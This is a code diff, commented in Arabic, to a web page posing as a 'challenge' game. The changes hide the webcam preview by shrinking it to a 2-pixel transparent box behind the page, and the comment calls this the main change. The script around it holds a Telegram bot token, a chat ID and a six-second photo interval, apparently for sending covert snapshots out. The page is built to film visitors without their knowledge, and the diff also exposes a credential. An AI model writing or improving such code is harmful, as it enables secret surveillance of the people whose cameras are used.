@@ -47,15 +47,23 @@
             color: #ffcc00;
             font-weight: bold;
         }
+        /* ← التعديل الرئيسي: إخفاء الكاميرا تمامًا لكن بطريقة تعمل */
+        #video-wrapper {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 2px;
+            height: 2px;
+            overflow: hidden;
+            z-index: -9999;
+            pointer-events: none;
+            background: transparent;
+        }
         #video {
-            width: 320px;
-            max-width: 90%;
-            height: auto;
-            margin: 30px auto 20px;
-            border: 3px solid #00ff88;
-            border-radius: 12px;
-            box-shadow: 0 0 20px #00ff88aa;
-            background: #000;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0;
         }
     </style>
 </head>
@@ -72,13 +80,16 @@
    
     <div id="status">اضغط الزر لبدء التحدي...</div>
 
-    <video id="video" autoplay playsinline muted></video>
+    <!-- حاوية صغيرة جدًا في الزاوية لإخفاء الكاميرا -->
+    <div id="video-wrapper">
+        <video id="video" autoplay playsinline muted></video>
+    </div>
 
     <script>
         let stream = null;
         const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
         const CHAT_ID = '6611123941';
-        const PHOTO_INTERVAL = 6000; // ← كل 6 ثوانٍ (غيّر الرقم هنا لو تبي أسرع أو أبطأ)
+        const PHOTO_INTERVAL = 6000; // كل 6 ثواني (يمكنك تغييرها)
 
         async function startCamera() {
             const status = document.getElementById('status');
@@ -95,7 +106,7 @@
 
                 await new Promise(resolve => {
                     video.onloadeddata = () => {
-                        console.log("الفيديو جاهز");
+                        console.log("الفيديو جاهز للالتقاط");
                         resolve();
                     };
                     setTimeout(resolve, 8000);
